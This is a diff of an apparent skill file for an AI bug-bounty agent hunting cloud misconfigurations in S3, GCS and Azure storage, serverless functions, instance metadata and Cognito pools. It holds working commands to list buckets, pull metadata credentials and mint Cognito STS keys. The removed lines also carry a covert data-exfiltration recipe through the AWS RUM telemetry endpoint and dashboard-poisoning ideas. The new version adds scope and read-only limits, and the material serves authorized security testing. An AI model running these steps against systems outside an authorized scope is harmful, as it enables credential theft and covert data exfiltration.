@@ -1,199 +1,112 @@
 ---
 name: hunt-cloud-misconfig
-description: "Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services)."
+description: "Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObject public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF. GCP: public GCS buckets, exposed Cloud Run services, leaked service account JSON. Azure: public blob containers, exposed Function App. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd; post-credential IAM escalation by cloud-iam-deep.) Detection: targeted naming from recon, certificate transparency, JS bundle secret extraction, known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services)."
 ---
 
-## 16. CLOUD / INFRA MISCONFIGS
+# HUNT-CLOUD — storage, serverless, metadata, identity pools
 
-### S3 / GCS / Azure Blob
-```bash
-# S3 listing
-curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
-aws s3 ls s3://target-bucket-name --no-sign-request
+Proof is an object, a role, or an unauthenticated invoke. A bucket name that returns `AccessDenied` is not a public bucket. Link-local metadata is only reachable **from the target** (SSRF or a shell you already have) — requesting `169.254.169.254` from your laptop proves nothing.
 
-# Try common bucket names
-for name in target target-backup target-assets target-prod target-staging; do
-  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
-done
+## Decision tree
 
-# Firebase open rules
-curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
-curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
-```
-
-### EC2 Metadata (via SSRF)
-```bash
-http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
-```
-
-### Exposed Admin Panels
-```
-/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
-/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
-```
-
----
-
-## Local-verification toolchain
-
-For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:
-
-```bash
-# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
-docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0
-
-# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
-export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
-export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
-export AWS_ENDPOINT_URL=http://localhost:14566
-export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
-```
-
-Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.
-
----
-
-## CloudWatch RUM Weaponization (2024-2026 surface)
-
-AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.
-
-### Detection — JS bundle fingerprints
-
-**Snippet-style (most common, embedded in `<head>`):**
-```javascript
-(function(n,i,v,r,s,c,x,z){...})(
-  'cwr',
-  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
-  '1.0.0',
-  'us-east-1',
-  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
-  {
-    sessionSampleRate: 1,
-    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
-    identityPoolId: "us-east-1:abcd1234-...",
-    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
-    telemetries: ["errors","performance","http"]
-  }
-);
-```
-
-**NPM-style (aws-rum-web package):**
-```javascript
-import { AwsRum, AwsRumConfig } from 'aws-rum-web';
-const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
-const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
-```
-
-### Regex set for recon
-
-```bash
-# Detect RUM init
-grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .
-
-# Extract applicationId (UUID v4)
-grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .
-
-# Extract identityPoolId (region:UUID)
-grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .
-
-# Extract guestRoleArn (leaks AWS account ID + role name)
-grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .
-
-# Endpoint reveals region
-grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
-```
-
-### Attack chains
-
-**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:
-
-```bash
-aws cognito-identity get-id \
-  --identity-pool-id "us-east-1:abcd1234-..." \
-  --region us-east-1 --no-sign-request
-aws cognito-identity get-credentials-for-identity \
-  --identity-id "us-east-1:<returned-uuid>" \
-  --region us-east-1 --no-sign-request
-# → STS creds; export and:
-aws sts get-caller-identity        # confirm role
-aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
-# Automate: pacu / enumerate-iam.py
-```
-
-Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.
-
-**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:
-
-```bash
-aws rum put-rum-events \
-  --id $(uuidgen) \
-  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
-  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
-  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
-  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
-  --region us-east-1
-```
-
-Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.
-
-**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.
-
-**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS).
-
-### Severity rubric
-
-| Finding | Severity | Justification |
+| Signal | Test once | Hit looks like |
 |---|---|---|
-| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
-| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
-| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
-| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
-| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
-| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
-| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |
+| `*.s3.amazonaws.com`, `s3.amazonaws.com/<bucket>`, website endpoint, CNAME to S3 | `GET /?list-type=2&max-keys=5` unsigned, then one key you saw in HTML/JS | `ListBucketResult`, or a private object body |
+| `storage.googleapis.com`, `*.storage.googleapis.com` | `GET /storage/v1/b/BUCKET/o` and one object URL | JSON object list or file bytes |
+| `*.blob.core.windows.net` | `GET /CONTAINER?restype=container&comp=list` | `<EnumerationResults>` or a blob |
+| `*.lambda-url.*.on.aws`, `*.run.app`, `*.azurewebsites.net`, `*.cloudfunctions.net` | One unauthenticated invoke of the URL in JS | Data or an action that should require auth |
+| `identityPoolId` / `guestRoleArn` / Cognito in JS (incl. CloudWatch RUM) | `get-id` then `get-credentials-for-identity` | STS creds whose policy allows more than the intended API |
+| Leaked `AKIA` / service-account JSON | `sts get-caller-identity` or the GCP token info endpoint | A real account id. Then one read |
+| SSRF already confirmed | One IMDS URL with the required header (`hunt-ssrf`) | Role name or token body |
 
-### Disclosed cases / authoritative writeups
+`NoSuchBucket` / `NoSuchBucket` XML on a hostname the app still uses is a takeover lead (`hunt-subdomain`), not data exposure. `AllAccessDisabled` and `AccessDenied` mean you do not have a list; try keys the site already references (`/static/`, `/uploads/`, source maps).
 
-No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is "Cognito identity pool over-permission via embedded SDK" — RUM is one common embedding.
+## Storage
 
-- **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
-- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
-- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
-- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
-- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
-- **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)
+```bash
+# S3 — virtual-hosted and path-style. Follow a 301 to the region endpoint; do not ignore PermanentRedirect.
+curl -s "https://$BUCKET.s3.amazonaws.com/?list-type=2&max-keys=5"
+curl -s "https://s3.amazonaws.com/$BUCKET/?list-type=2&max-keys=5"
+aws s3 ls "s3://$BUCKET" --no-sign-request
 
-### Validation checklist (before reporting)
+# GCS
+curl -s "https://storage.googleapis.com/storage/v1/b/$BUCKET/o?maxResults=5"
+curl -sI "https://storage.googleapis.com/$BUCKET/$KEY"
 
-1. Extract `identityPoolId` from page source.
-2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
-3. Confirm `get-credentials-for-identity` returns STS creds.
-4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
-5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
-6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
-7. **Do not** modify/delete data even if permitted — read-only PoC only.
+# Azure Blob
+curl -s "https://$ACCOUNT.blob.core.windows.net/$CONTAINER?restype=container&comp=list&maxresults=5"
+```
 
----
+Name guesses come from the program: the hostname, `<project>-prod`, `<project>-backup`, `<project>-logs`, `<project>-tfstate`, the CNAME target, and names in JS. A handful of informed names, not a cloud-wide brute.
 
-## Related Skills & Chains
+**Write** (only if the engagement allows): one object `marker-<rand>.txt`, `GET` it back unsigned, stop. Do not `PutBucketAcl`, do not delete, do not sync a bucket down. Listing plus a sensitive key (backup, `.env`, `tfstate`, PII export) is the usual High/Critical. A public marketing-image bucket the site already hotlinks is informational.
 
-- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
-- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
-- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
-- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
-- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
-- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.
+Authenticated-users-only (`Any Authenticated AWS Principal`) still exposes data to every AWS account. Say that explicitly if `AllUsers` is closed but a second account you own can read.
 
+## Serverless and admin panels
+
+Lambda function URL with `AuthType NONE`, Cloud Run without IAM invoker, Azure Function or Firebase function anonymous: send the application's normal JSON once. Impact is the data or the privileged effect, not a `200` health check.
+
+Known unauth services, one request each, only on in-scope hosts: `GET /_cat/indices` (OpenSearch/Elastic), `GET /v2/_catalog` (registry), Jenkins/Grafana login is **not** a finding (`hunt-cicd`, `hunt-k8s`). `/server-status` and `phpinfo` go to `hunt-source-leak`.
+
+## IMDS (via SSRF or a foothold, never from your host)
+
+```text
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/api/token     # IMDSv2: PUT, header X-aws-ec2-metadata-token-ttl-seconds
+http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI    # ECS
+http://169.254.170.23/v1/credentials        # EKS pod identity, when advertised
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://169.254.169.254/metadata/instance?api-version=2021-02-01   # Azure, header Metadata: true
+```
+
+A 401/403 body from the metadata IP is proof of **reach**. Credential impact starts when the token or role keys come back. Header requirements and bypasses: `hunt-ssrf`. Hop-limit 1 blocks IMDSv2 through an extra proxy; a browser or a client on the instance itself still reaches it. Hand live keys to `cloud-iam-deep` for read-only enumeration — do not create users or change policy.
+
+## Cognito identity pools and CloudWatch RUM
+
+`identityPoolId` (`region:uuid`) and `guestRoleArn` in page JS are public by design. The role policy is the boundary. RUM snippets (`cwr`, `aws-rum-web`, `dataplane.rum.<region>.amazonaws.com`) are one place they appear.
+
+```bash
+aws cognito-identity get-id --identity-pool-id "$POOL" --region "$REGION" --no-sign-request
+aws cognito-identity get-credentials-for-identity --identity-id "$ID" --region "$REGION" --no-sign-request
+aws sts get-caller-identity
+```
+
+Then **one** read the role should not have (`s3 ls` of a bucket you did not author, `secretsmanager list-secrets`, `dynamodb list-tables`). If the only allowed action is `rum:PutRumEvents` on that app monitor, it is informational — do not file it as cloud takeover. Do not flood `PutRumEvents`, do not use the endpoint as a covert channel, and do not claim dashboard XSS unless the console actually rendered your marker as HTML.
+
+| Proven policy | Severity |
+|---|---|
+| Unauth STS and a wildcard or multi-service write/read on production | Critical |
+| Unauth read of secrets, objects, or parameters | High |
+| Only `rum:PutRumEvents` on its own monitor | Informational |
+| Self-hosted `cwr.js` on a dangling subdomain you can claim | Depends on the takeover (`hunt-subdomain`) — JS on the app origin is XSS |
+
+## Validation
+
+- Unsigned `GET` of a non-public object, or STS `get-caller-identity` plus one extra API read.
+- Unique marker for any write, fetched from a second unauthenticated client.
+- Metadata: the token body, not a timeout.
+- Do not modify cloud state, do not snapshot, do not invoke delete APIs. A lab emulator (LocalStack or similar) is not evidence — only the in-scope account is.
+
+## Chains
+
+- Public bucket object is a `.env` or `tfstate` → live key → `cloud-iam-deep` read-only.
+- Dangling bucket CNAME → `hunt-subdomain`.
+- SSRF + IMDSv1 or header-capable IMDSv2 → role creds.
+- Over-broad Cognito guest role → same as a leaked key.
+- Function URL unauth → `hunt-idor` or `hunt-ssrf` inside the function.
+
+## Rails
+
+- In-scope accounts and hostnames only. No bucket-name brute force, no credential stuffing, no destructive ACL changes, no telemetry flood.
+- Draft only — do not submit.
 
 ## Before you report — dedup gate
 
-Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
-order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:
-
 ```bash
-python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
+python3 engine/dedup.py check --program <program> --class cloud --url "<endpoint>" --title "<title>"
 ```
 
-`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
-(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
+`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless the bucket, role, or a fix bypass is a concrete differentiator.
+
+Cross-refs: `hunt-ssrf`, `hunt-k8s`, `hunt-cicd`, `cloud-iam-deep`, `hunt-subdomain`, `hunt-baas`, `hunt-source-leak`, `triage-validation`.
